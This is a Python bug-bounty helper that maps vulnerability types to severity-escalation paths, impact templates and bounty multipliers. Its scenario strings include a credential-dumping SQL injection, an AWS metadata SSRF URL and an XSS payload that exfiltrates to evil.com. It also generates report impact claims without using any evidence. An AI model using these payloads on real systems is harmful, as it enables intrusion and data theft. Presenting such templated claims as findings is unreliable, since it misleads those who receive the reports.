#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ImpactEscalator — 漏洞影响升级器 (P2→P1)

顶级白客和普通白客的差距: 不是能不能找到洞, 而是能不能证明影响。
同一个SQLi:
  普通: "id参数存在SQL注入" → $500
  顶级: "id参数存在SQL注入, 可提取20万用户手机号+密码哈希" → $5000

用法:
    from aimy.tools.impact_escalator import ImpactEscalator
    ie = ImpactEscalator()
    p1 = ie.escalate(vuln_class="sqli", endpoint="/api/user?id=1")
    # -> 返回P1证据 + 业务影响描述
"""

import json
import re
from typing import Any

# ── 各漏洞类的P1升级路径 ────────────────────────────

ESCALATION_PATHS: dict[str, list[dict]] = {
    "sqli": [
        {"target": "user_data",      "desc": "提取用户表数据(手机号/邮箱/密码)",
         "severity": "critical",      "bounty_boost": "5x-10x"},
        {"target": "admin_creds",    "desc": "提取管理员凭据, 完全接管后台",
         "severity": "critical",      "bounty_boost": "10x-20x"},
        {"target": "database_dump",  "desc": "全库拖取, 所有业务数据暴露",
         "severity": "critical",      "bounty_boost": "5x-8x"},
        {"target": "file_read",      "desc": "通过SQL读取服务器文件(LoG Poisioning)",
         "severity": "high",          "bounty_boost": "3x-5x"},
    ],
    "idor": [
        {"target": "mass_leak",      "desc": "遍历ID提取所有用户数据",
         "severity": "critical",      "bounty_boost": "5x-10x"},
        {"target": "admin_access",   "desc": "越权访问管理端功能",
         "severity": "high",          "bounty_boost": "3x-5x"},
        {"target": "account_takeover","desc": "IDOR+密码重置 → 任意账户接管",
         "severity": "critical",      "bounty_boost": "10x"},
    ],
    "ssrf": [
        {"target": "cloud_metadata", "desc": "读取云元数据 → IAM临时凭据",
         "severity": "critical",      "bounty_boost": "10x-20x"},
        {"target": "internal_scan",  "desc": "扫描内网端口/服务 → 横向移动",
         "severity": "high",          "bounty_boost": "5x-10x"},
        {"target": "rce",            "desc": "SSRF→内部RCE接口→完全控制",
         "severity": "critical",      "bounty_boost": "20x+"},
    ],
    "xss": [
        {"target": "account_takeover","desc": "XSS→窃取Cookie/Session→账户接管",
         "severity": "high",          "bounty_boost": "3x-5x"},
        {"target": "key_logger",     "desc": "XSS→键盘记录→凭据捕获",
         "severity": "high",          "bounty_boost": "3x"},
        {"target": "admin_hijack",   "desc": "XSS→管理员Cookie→完全控制",
         "severity": "critical",      "bounty_boost": "10x"},
    ],
    "lfi": [
        {"target": "source_code",    "desc": "读取源代码, 发现更多0day",
         "severity": "high",          "bounty_boost": "3x-5x"},
        {"target": "credentials",    "desc": "读取配置文件/凭据文件",
         "severity": "high",          "bounty_boost": "3x-5x"},
        {"target": "rce",            "desc": "LFI→Log Poisoning→RCE",
         "severity": "critical",      "bounty_boost": "10x+"},
    ],
    "cmdi": [
        {"target": "reverse_shell",  "desc": "命令执行→反弹Shell→内网入口",
         "severity": "critical",      "bounty_boost": "10x+"},
        {"target": "data_exfil",     "desc": "命令执行→数据外传",
         "severity": "critical",      "bounty_boost": "5x-10x"},
    ],
    "open_redirect": [
        {"target": "oauth_token",    "desc": "开放重定向+OAuth→窃取Token",
         "severity": "high",          "bounty_boost": "3x-5x"},
        {"target": "phishing",       "desc": "开放重定向→钓鱼页(可信域名)",
         "severity": "medium",        "bounty_boost": "2x"},
    ],
    "info_disclosure": [
        {"target": "pii_exposure",   "desc": "泄露的正是PII数据(手机号/身份证)",
         "severity": "high",          "bounty_boost": "3x-5x"},
        {"target": "credential_in",  "desc": "泄露中包含凭据→直接登录",
         "severity": "high",          "bounty_boost": "3x-5x"},
    ],
    "ssti": [
        {"target": "rce",            "desc": "SSTI→模板引擎RCE→服务器控制",
         "severity": "critical",      "bounty_boost": "10x+"},
        {"target": "config_leak",    "desc": "SSTI→读取配置/密钥",
         "severity": "high",          "bounty_boost": "3x-5x"},
    ],
    "auth_bypass": [
        {"target": "admin_panel",    "desc": "绕过认证→未授权进后台",
         "severity": "critical",      "bounty_boost": "5x-10x"},
        {"target": "user_impersonate","desc": "绕过认证→模拟任意用户",
         "severity": "critical",      "bounty_boost": "10x"},
    ],
    "business_logic": [
        {"target": "financial_loss", "desc": "业务逻辑缺陷→直接经济损失(0元购物)",
         "severity": "critical",      "bounty_boost": "10x+"},
        {"target": "unlimited_use",  "desc": "无限次使用(优惠券/积分/试用)",
         "severity": "high",          "bounty_boost": "3x-5x"},
    ],
    "race_condition": [
        {"target": "financial_gain", "desc": "竞态条件→多次提现/多次使用优惠券",
         "severity": "high",          "bounty_boost": "3x-5x"},
        {"target": "bypass_limit",   "desc": "竞态→绕过限额/限次",
         "severity": "high",          "bounty_boost": "3x"},
    ],
}

# ── 业务影响描述模板 ────────────────────────────────

IMPACT_STATEMENTS: dict[str, str] = {
    "sqli": "攻击者可利用SQL注入漏洞提取数据库中的用户个人信息(姓名、手机号、邮箱、密码哈希),"
            "导致{count}+用户数据泄露, 符合GDPR/个人信息保护法违规标准, 风险评估为严重。",
    "idor": "攻击者可遍历ID参数访问{count}+其他用户的{data_type},"
            "属于大规模数据泄露, 影响用户隐私和平台信誉。",
    "ssrf": "攻击者可利用SSRF访问内部云元数据服务, 获取云平台IAM临时凭据,"
            "进而控制整个云账号资源, 影响范围包括所有{cloud}服务。",
    "xss": "攻击者可构造恶意链接, 诱骗用户/管理员点击后窃取其会话Cookie,"
           "实现账户接管, 若目标为管理员则完全控制后台。",
    "lfi": "攻击者可读取服务器任意文件, 包括源代码和配置文件,"
           "进而发现更多漏洞或获取数据库凭据直连数据库。",
    "cmdi": "攻击者可在服务器上执行任意系统命令, 获取服务器完整控制权,"
            "作为内网横向移动的跳板机。",
    "auth_bypass": "攻击者可未授权访问需要认证的功能/数据,"
                   "完全绕过访问控制, 获取{role}级别权限。",
    "business_logic": "攻击者可利用业务逻辑缺陷造成{company}直接经济损失,"
                      "每次利用损失{amount}元, 且可无限次重复。",
}

# ── 场景化示例 ────────────────────────────────────

P1_SCENARIOS: dict[str, str] = {
    "sqli_user_data": "发送payload `1 UNION SELECT username,password,email FROM users` "
                      "即可提取所有用户凭据, 影响全部注册用户。",
    "idor_order": "遍历order_id从1000到2000, 可查看其他用户的订单详情"
                  "(收货地址、手机号、支付信息), 影响{count}笔订单。",
    "ssrf_aws": "SSRF到http://169.254.169.254/latest/meta-data/iam/security-credentials/"
                "即可获取AWS临时访问密钥, 控制整个云账号。",
    "xss_admin": "payload `<script>fetch('/admin/users',{credentials:'include'}).then(r=>r.text()).then(t=>fetch('https://evil.com/log?'+t))</script>`"
                 "可窃取管理员的用户列表页面, 获取所有用户信息。",
}


class ImpactEscalator:
    """漏洞影响升级器 — P2→P1。"""

    def __init__(self, verbose: bool = False):
        self.verbose = verbose

    def escalate(self, vuln_class: str = "",
                 endpoint: str = "",
                 param: str = "",
                 evidence: str = "",
                 context: dict | None = None) -> dict:
        """尝试升级漏洞影响等级。

        Args:
            vuln_class: 漏洞类 (sqli/idor/ssrf/...)
            endpoint: 漏洞端点
            param: 漏洞参数
            evidence: 已有证据
            context: 上下文信息 (count, data_type, role等)

        Returns:
            {"original": "sqli", "escalated_to": "critical",
             "path": "admin_creds", "business_impact": "...",
             "estimated_bounty_boost": "5x-10x", "scenario": "..."}
        """
        vc = vuln_class.lower().strip()
        paths = ESCALATION_PATHS.get(vc, [])

        if not paths:
            return {
                "original": vc,
                "escalated_to": None,
                "path": None,
                "business_impact": f"无预设P1升级路径 for {vc}",
                "estimated_bounty_boost": "1x",
                "scenario": "手动分析该漏洞的业务上下文",
            }

        ctx = context or {}
        count = ctx.get("count", "待定")
        data_type = ctx.get("data_type", "敏感数据")
        role = ctx.get("role", "管理员")
        company = ctx.get("company", "目标企业")
        amount = ctx.get("amount", "待定")
        cloud = ctx.get("cloud", "云平台")

        # 选择最佳升级路径 (第一条通常最高危)
        best = paths[0]

        # 生成业务影响描述
        impact_template = IMPACT_STATEMENTS.get(vc, "")
        business_impact = impact_template.format(
            count=count, data_type=data_type, role=role,
            company=company, amount=amount, cloud=cloud
        ) if impact_template else f"{vc}漏洞可能导致{data_type}泄露"

        # 场景化示例
        scenario_key = f"{vc}_{best['target']}"
        scenario = P1_SCENARIOS.get(scenario_key, best["desc"])

        result = {
            "original": vc,
            "escalated_to": best["severity"],
            "path": best["target"],
            "business_impact": business_impact.format(
                count=count, data_type=data_type
            ),
            "estimated_bounty_boost": best["bounty_boost"],
            "scenario": scenario.format(count=count),
            "endpoint": endpoint,
            "param": param,
        }

        if self.verbose:
            print(f"  [!] 影响升级: {vc} → {best['severity']} ({best['bounty_boost']})")
            print(f"      路径: {best['target']}")
            print(f"      场景: {scenario[:80]}...")

        return result

    def escalate_all(self, findings: list[dict]) -> list[dict]:
        """批量升级所有发现。"""
        results = []
        for f in findings:
            result = self.escalate(
                vuln_class=f.get("vuln_class", f.get("type", "")),
                endpoint=f.get("endpoint", f.get("url", "")),
                param=f.get("param", ""),
                context=f.get("context", {}),
            )
            results.append(result)
        return results

    def report_block(self, result: dict) -> str:
        """生成报告段 (可直接贴到报告里)。"""
        return f"""
### 影响评估 (由ImpactEscalator自动生成)

**原始漏洞**: {result['original']}
**升级后评级**: {result['escalated_to'].upper()}
**利用路径**: {result['path']}
**预估赏金提升**: {result['estimated_bounty_boost']}

**业务影响**:
{result['business_impact']}

**利用场景**:
{result['scenario']}

**受影响端点**: {result['endpoint']}
"""
